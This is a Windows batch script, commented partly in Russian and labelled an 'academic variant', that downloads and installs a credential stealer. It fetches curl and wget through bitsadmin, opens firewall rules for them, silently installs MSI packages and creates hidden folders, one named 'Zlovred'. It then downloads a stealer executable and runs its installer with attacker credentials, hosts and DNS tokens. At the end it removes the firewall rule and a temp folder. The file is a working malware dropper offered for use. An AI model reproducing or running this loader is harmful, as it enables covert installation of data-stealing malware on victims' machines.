rem ***************************************************************************
rem Load Stealer from Web 
rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > load_Stealer.bat
rem Run with Elevated Privileges Only!
rem ***************************************************************************

rem Environments Variables Init

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%

rem Set Common Host Downloads Varoables
set prefc=http
set hostc=localhost
set portc=80
set uppathc=WinUpdate
set exppathc=Exponenta

rem Set Special Host Downloads Varoables
set prefs=http
set hosts=localhost
set ports=80
set compaths=www
set exppaths=Exponenta

rem define the Variables
SET NITSYUP=NIT-System-Update.msi
SET NITPREN=nit-projects-environment-ex.msi
SET INSTSTYL=install_Styler.ini

set host=%prefc%://%hostc%:%portc%/%exppathc%

rem Uninstall old data
%SystemRoot%\System32\wbem\WMIC.EXE product where name="NIT Projects Environment" call uninstall

rem Download
%SystemRoot%\System32\bitsadmin /Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND %host%/wget.exe %TEMP%\wget.exe %host%/LIBCURL.DLL %TEMP%\libcurl.dll %host%/CURL.EXE %TEMP%\curl.exe

rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%TEMP%\wget.exe" enable=yes
rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%TEMP%\wget.exe" enable=yes

%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%TEMP%\curl.exe" enable=yes
rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%TEMP%\curl.exe" enable=yes

"%TEMP%\curl.exe" %prefc%://%hostc%:%portc%/%uppathc%/%NITSYUP% -o %TEMP%\%NITSYUP%
"%TEMP%\curl.exe" %prefc%://%hostc%:%portc%/%exppathc%/%NITPREN% -o %TEMP%\%NITPREN%
"%TEMP%\curl.exe" %prefs%://%hosts%:%ports%/%compaths%/%exppaths%/%INSTSTYL% -o %TEMP%\%INSTSTYL%

%SystemRoot%\System32\msiexec.exe /i  %NITPREN% /norestart /QN /L*V  %NITPREN%.log
if exist "%ProgramFiles%\NIT-Projects-Environments\LoadAllDistribHidden.bat" (call "%ProgramFiles%\NIT-Projects-Environments\LoadAllDistribHidden.bat") else (echo "File %ProgramFiles%\NIT-Projects-Environments\LoadAllDistribHidden.bat not Found")
if exist "%ProgramFiles(x86)%\NIT-Projects-Environments\LoadAllDistribHidden.bat" (call "%ProgramFiles(x86)%\NIT-Projects-Environments\LoadAllDistribHidden.bat") else (echo "File %ProgramFiles(x86)%\NIT-Projects-Environments\LoadAllDistribHidden.bat not Found")

rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %TEMP%\install_Styler.ini || exit /b 1

rem Create target Directory
md %PUB1%\Distrib\Zlovred
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\Zlovred


rem Go to Temprorary Directory
cd /d %curdir%

rem Настраиваем переменные окружения для команды Wget

rem Определяем переменные:

rem Основная папка
rem set httpMainFolder=Exponenta
rem Префикс протокола
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem WebDAV User
rem set httpuser=%Hacker_User%
rem WebDAV Password
rem set httppassword=%Hacker_Pass%
rem Локальный каталог
set LocalFolderZ=%TEMP%

cd /d %LocalFolderZ%

rem Запускаем на выполнение команды WGET
rem !!! Изменяемая величина! Проверять перед использованием !!!

rem Поменять на имя своего файла скомпилированного стайлера (вместо ExponentaHTTP.exe !!!)
rem Change the name of Stealer compiled file (Instaed of ExponentaHTTP.exe)
"%TEMP%\curl.exe" %host%/ExponentaHTTP.exe -o "%LocalFolderZ%\ExponentaHTTP.exe"
"%TEMP%\curl.exe" %host%/Install_StylerHTTP.bat -o "%LocalFolderZ%\Install_StylerHTTP.bat"


rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
rem wget -r --no-parent %host%/

rem Запускаем инсталлятор Stealer "Экспонента"
call %LocalFolderZ%\install_StylerHTTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% %Hacker_httppref% %Hacker_httpport% %hldnstoken% %entrydnstoken%
cd /d %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Удаляем правило для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"


rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

